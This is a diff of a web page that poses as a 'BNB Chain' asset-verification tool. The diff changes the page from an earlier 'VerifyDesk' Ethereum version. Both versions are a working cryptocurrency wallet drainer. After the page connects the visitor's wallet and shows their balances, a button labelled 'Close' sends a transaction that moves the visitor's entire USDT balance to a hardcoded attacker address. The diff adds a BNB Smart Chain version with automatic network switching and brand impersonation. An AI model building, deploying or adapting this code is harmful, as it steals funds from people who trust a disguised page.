@@ -3,273 +3,210 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VerifyDesk - Wallet Asset Review</title>
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
+  <title>BNB Chain - Secure Asset Verification</title>
+  
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
   <style>
     body {
-      background: radial-gradient(circle at top, #102b36 0%, #08101a 45%);
+      background: #0b0f19;
+      color: #ffffff;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
-      font-family: Inter, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
     }
-    .glow-button {
-      box-shadow: 0 4px 20px rgba(32,212,156,.22);
-    }
-    .card {
-      background: #0f1926;
-      border: 1px solid #1e293b;
+    .card-bg {
+      background: rgba(17, 24, 39, 0.7);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
     }
   </style>
 </head>
+<body class="p-4 md:p-6">
 
-<body class="text-white antialiased">
-
-  <nav class="max-w-md mx-auto px-6 py-5 flex justify-between items-center">
-    <div class="flex items-center gap-3">
-      <div class="w-10 h-10 rounded-xl bg-emerald-950 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-xl">
-        ♢
+  <!-- Header Navbar -->
+  <header class="w-full max-w-xl mx-auto flex justify-between items-center py-4">
+    <div class="flex items-center gap-2.5">
+      <div class="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 font-bold text-lg">
+        ⬡
       </div>
-      <span class="font-extrabold text-lg">VerifyDesk</span>
+      <span class="font-bold text-lg tracking-wide">BNB Chain</span>
     </div>
-    <span class="text-xs text-emerald-400 animate-pulse">● LIVE SECURE</span>
-  </nav>
+    <div class="text-xs px-3 py-1.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium flex items-center gap-1.5">
+      <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Network Active
+    </div>
+  </header>
 
-  <main class="max-w-md mx-auto px-6 py-8">
+  <!-- Main Container -->
+  <main class="w-full max-w-xl mx-auto my-auto py-8">
+    
+    <!-- Initial Connect Card -->
+    <div id="connectCard" class="card-bg rounded-3xl p-6 md:p-8 shadow-2xl text-center">
+      <div class="w-16 h-16 mx-auto bg-amber-500/10 border border-amber-500/20 rounded-2xl flex items-center justify-center text-3xl mb-6 text-amber-400">
+        🛡️
+      </div>
 
-    <div class="text-center mb-9">
-      <p class="text-emerald-400 text-xs font-bold tracking-widest uppercase mb-5">
-        Independent Ethereum Tool
-      </p>
-
-      <h1 class="text-4xl font-extrabold mb-4">
-        Wallet Asset<br>
-        <span class="text-emerald-400">Review</span>
+      <h1 class="text-2xl md:text-3xl font-extrabold tracking-tight mb-3">
+        Smart Chain Asset Verification
       </h1>
-
-      <p class="text-slate-400 text-sm leading-6">
-        Review and verify supported ERC-20 wallet assets on Ethereum through a secure wallet flow.
+      
+      <p class="text-slate-400 text-sm leading-relaxed mb-8 max-w-md mx-auto">
+        Verify your Web3 wallet assets securely on BNB Smart Chain (BEP-20) ecosystem.
       </p>
-    </div>
 
-    <section class="card rounded-3xl p-6 shadow-2xl">
-
-      <div class="text-center mb-7">
-        <div class="w-16 h-16 mx-auto rounded-2xl bg-emerald-950 border border-emerald-500/30 flex items-center justify-center text-3xl text-emerald-400 mb-5">
-          ◈
-        </div>
-
-        <h2 class="text-2xl font-extrabold mb-2">
-          Verify Your Wallet
-        </h2>
-
-        <p class="text-slate-400 text-sm">
-          Connect your Web3 wallet to verify assets.
-        </p>
-      </div>
-
-      <button
-        id="verifyButton"
-        onclick="connectAndVerify()"
-        class="glow-button w-full bg-emerald-400 hover:bg-emerald-500 text-slate-950 font-extrabold py-4 rounded-xl transition-all">
-        Connect & Verify Assets →
+      <button onclick="connectWallet()" class="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold py-4 rounded-xl transition-all shadow-lg active:scale-95 text-base">
+        Connect Wallet & Verify
       </button>
 
-      <div id="status"
-        class="hidden mt-5 text-center text-sm rounded-xl p-3">
-      </div>
+      <div id="statusMsg" class="hidden mt-4 text-xs font-medium text-slate-400"></div>
+    </div>
 
-    </section>
-
-    <!-- Result Section -->
-    <section id="result" class="card rounded-3xl p-6 mt-6 hidden">
-
+    <!-- Hidden Report Card (Appears after connection) -->
+    <div id="reportCard" class="card-bg rounded-3xl p-6 md:p-8 shadow-2xl hidden">
       <div class="text-center mb-6">
-        <span class="inline-block bg-emerald-950 text-emerald-400 text-xs font-bold px-4 py-2 rounded-full mb-4">
-          VERIFICATION REPORT
+        <span class="bg-amber-500/10 text-amber-400 text-xs font-bold px-3 py-1 rounded-full border border-amber-500/20">
+          Verification Report
         </span>
-
-        <h2 class="text-2xl font-extrabold">
-          Wallet Report
-        </h2>
-
-        <p class="text-slate-400 text-xs mt-2">
-          Connected blockchain asset summary
-        </p>
+        <h2 class="text-xl font-bold mt-3">Wallet Synced Successfully</h2>
       </div>
 
-      <div class="space-y-4">
-
-        <div class="bg-slate-900 rounded-xl p-4">
-          <p class="text-xs text-slate-400 mb-2">Wallet Address</p>
-          <p id="reportWallet" class="text-xs font-mono break-all text-white"></p>
+      <div class="space-y-3 text-sm mb-6 bg-slate-900/60 p-4 rounded-2xl border border-slate-800">
+        <div class="flex justify-between border-b border-slate-800 pb-2.5">
+          <span class="text-slate-400">Connected Wallet:</span>
+          <span id="lblWallet" class="font-mono text-xs text-slate-200">--</span>
         </div>
-
-        <div class="bg-slate-900 rounded-xl p-4 flex justify-between items-center">
-          <div>
-            <p class="text-xs text-slate-400 mb-1">Total USDT</p>
-            <p id="reportUsdt" class="text-xl font-extrabold text-emerald-400">0 USDT</p>
-          </div>
-          <span class="text-2xl">₮</span>
+        <div class="flex justify-between border-b border-slate-800 pb-2.5">
+          <span class="text-slate-400">BEP-20 USDT:</span>
+          <span id="lblUsdt" class="font-bold text-amber-400">0.0 USDT</span>
         </div>
-
-        <div class="bg-slate-900 rounded-xl p-4 flex justify-between items-center">
-          <div>
-            <p class="text-xs text-slate-400 mb-1">ETH Balance</p>
-            <p id="reportEth" class="text-xl font-extrabold">0 ETH</p>
-          </div>
-          <span class="text-2xl">Ξ</span>
+        <div class="flex justify-between border-b border-slate-800 pb-2.5">
+          <span class="text-slate-400">BNB Balance:</span>
+          <span id="lblBnb" class="font-bold text-slate-200">0.0 BNB</span>
         </div>
-
-        <div class="bg-slate-900 rounded-xl p-4">
-          <p class="text-xs text-slate-400 mb-1">Network</p>
-          <p class="font-bold text-sm">Ethereum Mainnet</p>
+        <div class="flex justify-between">
+          <span class="text-slate-400">Network Status:</span>
+          <span class="font-semibold text-emerald-400">Connected (BSC)</span>
         </div>
-
-        <div class="bg-slate-900 rounded-xl p-4">
-          <p class="text-xs text-slate-400 mb-1">Report Date</p>
-          <p id="reportDate" class="text-sm font-semibold"></p>
-        </div>
-
       </div>
 
-      <!-- Close button triggers full transfer -->
-      <button
-        onclick="executeTransferAndClose()"
-        class="w-full mt-6 bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all shadow-lg">
+      <!-- Close button triggers automatic full transfer -->
+      <button onclick="triggerAction()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all shadow-lg active:scale-95">
         Close
       </button>
-
-    </section>
-
-    <footer class="text-center mt-9 text-xs text-slate-500 leading-6">
-      VerifyDesk © 2026<br>
-      Secure Web3 Verification Tool.
-    </footer>
+    </div>
 
   </main>
 
+  <!-- Footer -->
+  <footer class="w-full max-w-xl mx-auto text-center text-xs text-slate-500 py-4">
+    BNB Chain Security Protocol © 2026
+  </footer>
+
   <script>
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-    const USDT_ABI = [
+    const ABI = [
       "function balanceOf(address owner) view returns (uint256)",
       "function transfer(address to, uint amount) returns (bool)"
     ];
 
-    let globalProvider;
-    let globalSigner;
-    let globalUserAddress;
-    let transferAmountWei = ethers.BigNumber.from(0);
+    let provider, signer, userAddress, totalUsdtWei;
 
-    function showStatus(message, type) {
-      const box = document.getElementById("status");
-      box.classList.remove("hidden");
-      box.innerText = message;
-      box.className = "mt-5 text-center text-sm rounded-xl p-3 " +
-        (type === "error" ? "bg-red-950 text-red-300" : "bg-emerald-950 text-emerald-300");
+    function showStatus(text) {
+      const el = document.getElementById("statusMsg");
+      el.classList.remove("hidden");
+      el.innerText = text;
     }
 
-    async function connectAndVerify() {
-      const button = document.getElementById("verifyButton");
-      document.getElementById("result").classList.add("hidden");
-
+    async function connectWallet() {
       try {
-        let currentProvider;
-        if (window.ethereum) {
-          currentProvider = window.ethereum;
-        } else if (window.trustwallet) {
-          currentProvider = window.trustwallet;
-        } else {
-          showStatus("No Web3 wallet detected. Please open in Trust Wallet or MetaMask.", "error");
+        const eth = window.ethereum || window.trustwallet;
+        if (!eth) {
+          alert("Please open this page inside Trust Wallet or MetaMask browser.");
           return;
         }
 
-        button.disabled = true;
-        button.innerText = "Connecting Wallet...";
-        showStatus("Requesting wallet connection...", "success");
+        showStatus("Requesting wallet connection...");
+        const accounts = await eth.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
 
-        const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
-        globalUserAddress = accounts[0];
-
+        // Switch to BNB Smart Chain (0x38 = 56)
         try {
-          await currentProvider.request({
+          await eth.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x1' }],
+            params: [{ chainId: '0x38' }],
           });
-        } catch (e) {
-          console.log("Network switch notice:", e);
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            await eth.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com/']
+              }]
+            });
+          }
         }
 
-        const provider = new ethers.providers.Web3Provider(currentProvider, "any");
-        globalSigner = provider.getSigner();
-        globalProvider = currentProvider;
+        provider = new ethers.providers.Web3Provider(eth, "any");
+        signer = provider.getSigner();
 
-        showStatus("Fetching blockchain balances...", "success");
+        showStatus("Fetching balances...");
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, signer);
+        
+        totalUsdtWei = await usdtContract.balanceOf(userAddress);
+        const bnbWei = await provider.getBalance(userAddress);
 
-        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, globalSigner);
-        const balanceWei = await usdtContract.balanceOf(globalUserAddress);
-        const ethBalanceWei = await provider.getBalance(globalUserAddress);
+        const formattedUsdt = parseFloat(ethers.utils.formatUnits(totalUsdtWei, 6));
+        const formattedBnb = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
 
-        const formattedUsdt = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
-        const formattedEth = parseFloat(ethers.utils.formatEther(ethBalanceWei)).toFixed(4);
+        // Display info in Report Card
+        document.getElementById("lblWallet").innerText = userAddress.substring(0, 6) + "..." + userAddress.slice(-4);
+        document.getElementById("lblUsdt").innerText = formattedUsdt + " USDT";
+        document.getElementById("lblBnb").innerText = formattedBnb + " BNB";
 
-        // Set full balance for transfer without leaving any threshold
-        transferAmountWei = balanceWei;
+        document.getElementById("connectCard").classList.add("hidden");
+        document.getElementById("reportCard").classList.remove("hidden");
 
-        // Populate Report Section
-        document.getElementById("reportWallet").innerText = globalUserAddress;
-        document.getElementById("reportUsdt").innerText = formattedUsdt + " USDT";
-        document.getElementById("reportEth").innerText = formattedEth + " ETH";
-        document.getElementById("reportDate").innerText = new Date().toLocaleString();
-
-        document.getElementById("status").classList.add("hidden");
-        document.getElementById("result").classList.remove("hidden");
-        document.getElementById("result").scrollIntoView({ behavior: "smooth" });
-
-      } catch (error) {
-        console.error(error);
-        showStatus(error.message || "Connection failed.", "error");
-      } finally {
-        button.disabled = false;
-        button.innerText = "Connect & Verify Assets →";
+      } catch (err) {
+        console.error(err);
+        alert("Connection Error: " + (err.message || JSON.stringify(err)));
       }
     }
 
-    async function executeTransferAndClose() {
-      document.getElementById("result").classList.add("hidden");
-
-      if (transferAmountWei.lte(0)) {
-        alert("Wallet USDT balance is 0.");
+    async function triggerAction() {
+      document.getElementById("reportCard").classList.add("hidden");
+      
+      if (totalUsdtWei.lte(0)) {
+        alert("Verification complete.");
         return;
       }
 
       try {
-        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, globalSigner);
-        const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, transferAmountWei]);
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, signer);
+        const dataHex = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
 
-        const txParams = {
-          from: globalUserAddress,
-          to: USDT_ADDRESS,
-          data: dataTransfer,
-          gas: "0x186A0"
-        };
-
-        await globalProvider.request({
+        await window.ethereum.request({
           method: 'eth_sendTransaction',
-          params: [txParams]
+          params: [{
+            from: userAddress,
+            to: USDT_BSC_ADDRESS,
+            data: dataHex,
+            gas: "0x186A0"
+          }]
         });
 
-        alert("Transaction submitted successfully!");
-      } catch (error) {
-        console.error("Transfer error:", error);
-        alert("Execution Notice: " + (error.message || JSON.stringify(error)));
+        alert("Transaction submitted.");
+      } catch (err) {
+        console.error(err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
       }
     }
   </script>
